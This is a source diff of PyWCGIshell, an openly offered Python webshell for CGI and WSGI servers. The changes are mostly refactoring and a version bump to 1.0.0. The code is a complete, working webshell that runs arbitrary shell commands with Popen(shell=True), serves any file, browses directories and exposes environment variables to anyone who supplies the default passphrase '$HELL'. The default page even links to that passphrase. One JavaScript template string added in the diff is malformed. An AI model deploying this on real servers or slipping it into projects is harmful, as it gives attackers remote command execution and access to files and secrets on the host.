@@ -19,15 +19,17 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###################
 
-"""This package implement a WebShell for CGI and WSGI server."""
+"""
+This package implement a WebShell for CGI and WSGI server.
+"""
 
 from os import getcwd, environ, path, scandir, _Environ
-from sys import getdefaultencoding
 from subprocess import Popen, PIPE, TimeoutExpired
 from socket import gethostname, gethostbyname
 from wsgiref.simple_server import make_server
-from typing import List, TypeVar
 from collections.abc import Callable
+from sys import getdefaultencoding
+from typing import List, TypeVar
 from base64 import b64encode
 from getpass import getuser
 import sysconfig
@@ -38,7 +40,16 @@ import html
 import sys
 import re
 
-__version__ = "0.0.2"
+__version__ = "1.0.0"
+__author__ = "Maurice Lambert"
+__author_email__ = "mauricelambert434@gmail.com"
+__maintainer__ = "Maurice Lambert"
+__maintainer_email__ = "mauricelambert434@gmail.com"
+__description__ = """
+This package implement a WebShell for CGI and WSGI server.
+"""
+license = "GPL-3.0 License"
+__url__ = "https://github.com/mauricelambert/PyWCGIshell"
 __copyright__ = """
 PyWCGIshell  Copyright (C) 2021  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
@@ -46,6 +57,7 @@ This is free software, and you are welcome to redistribute it
 under certain conditions.
 """
 copyright = __copyright__
+__license__ = license
 __all__ = ["WebShell"]
 
 BinaryListOrNone = TypeVar("BinaryListOrNone", List[bytes], None)
@@ -68,8 +80,9 @@ WEBSHELL_PAGE = f"""
             }}
 
             function add_commmand_output(command, output) {{
-                document.getElementById('history').innerHTML += '<button onclick="add_console_text(`' +
-                    output + '`)">' + command + '</button><br>';
+                document.getElementById('history').innerHTML += '<button ' +
+                    'onclick="add_console_text(`' + output + '`)">' + command
+                    + '</button><br>';
             }}
 
             function special_request(request_object, type) {{
@@ -87,7 +100,9 @@ WEBSHELL_PAGE = f"""
                 xhttp.onreadystatechange = function() {{
                     if (xhttp.readyState == 4 && xhttp.status == 200) {{
                         if (type == "command") {{
-                            let console_text = `>>> ${{request_object}}${{String.fromCharCode(10)}}${{xhttp.responseText}}`;
+                            let console_text = `>>> ${{request_object}}` +
+                                `${{String.fromCharCode(10)}}` +
+                                `${{xhttp.responseText}}`;
                             add_console_html(console_text);
                             add_commmand_output(request_object, console_text);
                         }} else if (type == "file") {{
@@ -95,7 +110,8 @@ WEBSHELL_PAGE = f"""
                             filename = filename[filename.length - 1]
                             download(xhttp.responseText, filename);
                         }} else if (type == "directory") {{
-                            document.getElementById('explorer').innerHTML = xhttp.responseText;
+                            document.getElementById('explorer').innerHTML =\
+ xhttp.responseText;
                         }}
                     }}
                 }};
@@ -122,12 +138,14 @@ WEBSHELL_PAGE = f"""
 
             function add_console_html(text) {{
                 let console_ = document.getElementById("console");
-                console_.innerHTML = `${{text}}${{String.fromCharCode(10)}}${{console_.innerHTML}}`;
+                console_.innerHTML = `${{text}}${{String.fromCharCode(10)}}` +
+                    `${{console_.innerHTML}}`;
             }}
 
             function add_console_text(text) {{
                 let console_ = document.getElementById("console");
-                console_.innerText = `${{text}}${{String.fromCharCode(10)}}${{console_.innerText}}`;
+                console_.innerText = `${{text}}${{String.fromCharCode(10)}} +
+                    ${{console_.innerText}}`;
             }}
 
             function console_clear() {{
@@ -186,9 +204,20 @@ WEBSHELL_PAGE = f"""
                 tab-size: 4;
                 background-color: black;
                 color: white;
-                font-family: "Courier", "Lucida Console", "Consolas", "sans-serif";
+                font-family: "Courier", "Lucida Console", "Consolas", \
+"sans-serif";
                 font-size: 100%;
                 float: inline-start
+            }}
+
+            ::selection {{
+                color: #444444;
+                background: #FF2222;
+            }}
+
+            ::-moz-selection {{
+              color: #444444;
+              background: #FF2222;
             }}
         </style>
     </head>
@@ -225,22 +254,27 @@ WEBSHELL_PAGE = f"""
                         <br>
                         <b>Default encoding: </b> {getdefaultencoding()}
                         <br>
-                        <b>Preferred encoding: </b> {locale.getpreferredencoding()}
+                        <b>Preferred encoding: </b>
+                        {locale.getpreferredencoding()}
                     </p>
                 </td>
                 <td class="center">
-                    <b>Command:</b> <input width="250" type="text" id="command">
-                    <input type="button" value="Send" onclick="special_request(document.getElementById('command').value, 'command')">
+                    <b>Command:</b> <input width="250" type="text"\
+ id="command">
+                    <input type="button" value="Send" onclick="special\
+_request(document.getElementById('command').value, 'command')">
                 </td>
                 <td class="right">
                     <p>
                         <b>User:</b> {getuser()}
                         <br>
-                        <b>Python version:</b> {sysconfig.get_python_version()}
+                        <b>Python version:</b>
+                        {sysconfig.get_python_version()}
                         <br>
                         <b>Python path: </b> {sys.executable}
                         <br>
-                        <b>Arguments:</b> {html.escape(" ".join(sys.argv[1:]))}
+                        <b>Arguments:</b>
+                        {html.escape(" ".join(sys.argv[1:]))}
                     </p>
                 </td>
             </tr>
@@ -264,15 +298,17 @@ WEBSHELL_PAGE = f"""
 
                 </td>
                 <td class="right">
-                    <button onclick="special_request('/', 'directory')">Root directory (/)</button>
+                    <button onclick="special_request('/', 'directory')">
+                        Root directory (/)
+                    </button>
                 </td>
             </tr>
         </table>
     </body>
 </html>
 """ % "".join(
-    f'<button onclick=\'env_click("{html.escape(value)}", "pre_{key}")\'>{key}'
-    f'</button><br><pre id="pre_{key}"></pre><br><br>'
+    f'<button onclick=\'env_click("{html.escape(value)}", "pre_{key}")\'>'
+    f'{key}</button><br><pre id="pre_{key}"></pre><br><br>'
     for key, value in environ.items()
 )
 
@@ -284,72 +320,83 @@ class WebShell:
     """This class implement a complete webshell with the default page,
     webshell page, server type, access to webshell...
 
-    type: the type of server (must be "cgi" or "wsgi", default="cgi")
+    type: the type of server (should be "cgi" or "wsgi", default="cgi")
     passphrase: your passphrase to get the webshell (default="$HELL")
-    pass_type: location for the passphrase:
-            [ "url" passphrase match if in "<servername>:<port><path><query string>",
-              "body" passphrase match if in content,
-              "arguments" passphrase match if in arguments names or values,
-              [CGI] "header_value" passphrase match if in Cookie, Referer, UserAgent or Accept
-              [WSGI] "header_value" passphrase match if in Cookie, Connection,
-                  UserAgent, Accept language, Accept encoding or Accept
-              "method" if passphrase is request method ]
+    pass_type: location for the passphrase (default=url):
+        "url" passphrase should be in \
+"<servername>:<port><path><query string>",
+        "body" passphrase should be in content,
+        "arguments" passphrase should be in query string,
+        "header_value" passphrase should be a header value,
+        "method" request method should be the passphrase
     """
 
-    def __init__(self):
-        self.type = "cgi" or "wsgi"
-        self.passphrase = "$HELL"
-        self.pass_type = "url" or "body" or "arguments" or "header_value" or "method"
+    def __init__(
+        self,
+        type_: str = "cgi",
+        passphrase: str = "$HELL",
+        pass_type: str = "url",
+    ):
+        self.type = type_  # "cgi" or "wsgi"
+        self.passphrase = passphrase
+        self.pass_type = pass_type
+        # "url" or "body" or "arguments" or "header_value" or "method"
         self.environ = environ
 
     def get_url(self) -> str:
 
-        """This function return the URL and set self.url."""
+        """
+        This function return the URL and set self.url.
+        """
 
         if self.type == "cgi":
             path = self.environ["SCRIPT_NAME"]
         elif self.type == "wsgi":
             path = self.environ["PATH_INFO"]
 
-        self.url = f'{self.environ["SERVER_NAME"]}:{self.environ["SERVER_PORT"]}{path}?{self.environ["QUERY_STRING"]}'
+        self.url = (
+            f'{self.environ["SERVER_NAME"]}:{self.environ["SERVER_PORT"]}'
+            f'{path}?{self.environ["QUERY_STRING"]}'
+        )
         return self.url
 
-    def get_method(self) -> str:
+    def set_method(self) -> str:
 
-        """This function return the request method and set self.method."""
+        """
+        This function return the request method and set self.method.
+        """
 
         self.method = self.environ["REQUEST_METHOD"]
         return self.method
 
     def get_headers(self) -> set:
 
-        """This function return a set of headers and define self.headers."""
+        """
+        This function return a set of headers and define self.headers.
+        """
 
         self.headers = {
-            self.environ["HTTP_ACCEPT"],
-            self.environ["HTTP_USER_AGENT"],
-            self.environ["HTTP_COOKIE"],
+            value
+            for key, value in self.environ.items()
+            if key.startswith("HTTP")
         }
-
-        if self.type == "cgi":
-            self.headers.add(self.environ["HTTP_REFERER"])
-        elif self.type == "wsgi":
-            self.headers.add(self.environ["HTTP_ACCEPT_LANGUAGE"])
-            self.headers.add(self.environ["HTTP_ACCEPT_ENCODING"])
-            self.headers.add(self.environ["HTTP_CONNECTION"])
 
         return self.headers
 
     def get_arguments(self) -> set:
 
-        """This function return a set of arguments and define self.arguments."""
+        """
+        This function return a set of arguments and define self.arguments.
+        """
 
         self.arguments = re.split("=|&", self.environ["QUERY_STRING"])
         return self.arguments
 
     def get_body(self) -> str:
 
-        """This function return the body and set self.body."""
+        """
+        This function return the body and set self.body.
+        """
 
         content_size = self.environ.get("CONTENT_LENGTH", "0")
 
@@ -367,8 +414,10 @@ class WebShell:
 
     def get_access(self) -> bool:
 
-        """This function return True if the passphrase
-        is in request or False."""
+        """
+        This function return True if the passphrase
+        is in request or False.
+        """
 
         if self.pass_type == "url":
             return self.passphrase in self.url
@@ -390,8 +439,10 @@ class WebShell:
 
     def get_type_page(self) -> BinaryListOrNone:
 
-        """This function define the request type: standard page,
-        command request, visit directory or WebShell page."""
+        """
+        This function define the request type: standard page,
+        command request, visit directory or WebShell page.
+        """
 
         if self.environ["HTTP_ACCEPT"] == "application/json":
             self.body_object = json.loads(self.body)
@@ -410,20 +461,26 @@ class WebShell:
             self.get_webshell_page()
             return self.send_page()
         else:
-            return self.standard_page()
+            return (
+                self.standard_page()
+                if self.type == "cgi"
+                else self.standard_page(self.environ, self.responder)
+            )
 
     def run(
         self, environ: _Environ = None, responder: Callable = None
     ) -> BinaryListOrNone:
 
-        """Run WebShell server."""
+        """
+        Run WebShell server.
+        """
 
         if self.type == "wsgi":
             self.responder = responder
             self.environ = environ
 
         self.get_url()
-        self.get_method()
+        self.set_method()
         self.get_headers()
         self.get_arguments()
         self.get_body()
@@ -432,7 +489,9 @@ class WebShell:
 
     def send_page(self) -> BinaryListOrNone:
 
-        """This funtion send page."""
+        """
+        This funtion send page.
+        """
 
         if self.type == "cgi":
             for header in self.response_headers:
@@ -445,14 +504,19 @@ class WebShell:
 
     def get_webshell_page(self) -> str:
 
-        """This function return the WebShell page."""
+        """
+        This function return the WebShell page.
+        """
 
         self.page = WEBSHELL_PAGE
         self.response_headers = [("Content-Type", "text/html; charset=utf-8")]
+        return self.page
 
     def try_decoding(self, data: bytes) -> str:
 
-        """This function decode bytes and return it as html string."""
+        """
+        This function decode bytes and return it as html string.
+        """
 
         string = ""
         for car in data:
@@ -465,12 +529,16 @@ class WebShell:
 
     def execute_command(self) -> str:
 
-        """This function execute command and return the output."""
+        """
+        This function execute command and return the output.
+        """
 
         command = self.body_object["command"]
         timeout = self.body_object.get("timeout")
 
-        process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
+        process = Popen(
+            command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE
+        )
 
         try:
             stdout, stderr = process.communicate(timeout=timeout)
@@ -486,34 +554,39 @@ class WebShell:
 
     def visit_directory(self) -> str:
 
-        """This function list files and directory and return it."""
+        """
+        This function list files and directory and return it.
+        """
 
         directory = path.normpath(self.body_object.get("directory"))
         self.response_headers = [("Content-Type", "text/html; charset=utf-8")]
-        self.page = ""
+
+        self.page = (
+            '<button onclick="special_request('
+            f"'{path.join(getcwd(), directory, '..')}',"
+            f" 'directory')\">..</button>"
+        ).replace("\\", "/")
 
         for element in scandir(path=directory):
             if element.is_file():
-                self.page += f"""
-                    <button onclick="special_request('{path.join(getcwd(), element.path)}', 'file')">
-                        {element.name}
-                    </button>
-                """.replace(
-                    "\\", "/"
-                )
+                self.page += (
+                    '<button onclick="'
+                    f"special_request('{path.join(getcwd(), element.path)}',"
+                    f" 'file')\">{element.name}</button>"
+                ).replace("\\", "/")
 
             elif element.is_dir():
-                self.page += f"""
-                    <button onclick="special_request('{path.join(getcwd(), element.path)}', 'directory')">
-                        {element.name}
-                    </button>
-                """.replace(
-                    "\\", "/"
-                )
+                self.page += (
+                    '<button onclick="'
+                    f"special_request('{path.join(getcwd(), element.path)}',"
+                    f" 'directory')\">{element.name}</button>"
+                ).replace("\\", "/")
 
     def get_file(self) -> str:
 
-        """This function send content file."""
+        """
+        This function send content file.
+        """
 
         filename = path.normpath(self.body_object.get("filename"))
 
@@ -529,22 +602,29 @@ class WebShell:
             ),
         ]
 
-    def standard_page(self) -> BinaryListOrNone:
+    def standard_page(
+        self, env: _Environ = None, start_response: Callable = None
+    ) -> BinaryListOrNone:
 
-        """Content of this function must be the default page or call it."""
+        """
+        Content of this function must be the default page or call it.
+        """
 
         self.response_headers = [("Content-Type", "text/html; charset=utf-8")]
         self.page = """<html><head><meta charset='utf-8'></head>
             <body><h1>WebShell (default page)</h1><a id="link">Click here</a>
-            <script>document.getElementById('link').href=window.location.href+'?$HELL'
+            <script>
+            document.getElementById('link').href=window.location.href+'?$HELL'
             </script></body></html>"""
 
         return self.send_page()
 
 
-def launch_wsgi():
+def launch_wsgi(webshell: WebShell):
 
-    """Default wsgi launcher."""
+    """
+    Default wsgi launcher.
+    """
 
     INTERFACE = "127.0.0.1" or ""
     PORT = 8000 or 80 or 443
@@ -552,30 +632,39 @@ def launch_wsgi():
     httpd.serve_forever()
 
 
-def print_copyright():
-    print(copyright)
+def main() -> None:
 
+    """
+    This function launch the default WebShell from the command line.
+    """
 
-if __name__ == "__main__":
     webshell = WebShell()
 
     if "wsgi" in sys.argv:
-        print_copyright()
+        print(copyright)
         from webbrowser import open as webopen
 
         webshell.type = "wsgi"
         webopen("http://127.0.0.1:8000/")
-        launch_wsgi()
+        launch_wsgi(webshell)
     elif webshell.type == "wsgi":
-        print_copyright()
-        launch_wsgi()
+        print(copyright)
+        launch_wsgi(webshell)
     elif webshell.type == "cgi":
         try:
             webshell.run()
         except KeyError:
-            print('ERROR: To try this WebShell in WSGI mode add "wsgi" as argument.')
+            print(
+                "ERROR: To try this WebShell in WSGI"
+                ' mode add "wsgi" as argument.'
+            )
             print('Use: "python3 -m PyWCGIshell wsgi" to try this WebShell')
         finally:
             print("<!--")
-            print_copyright()
+            print(copyright)
             print("-->")
+
+
+if __name__ == "__main__":
+    main()
+    sys.exit(0)
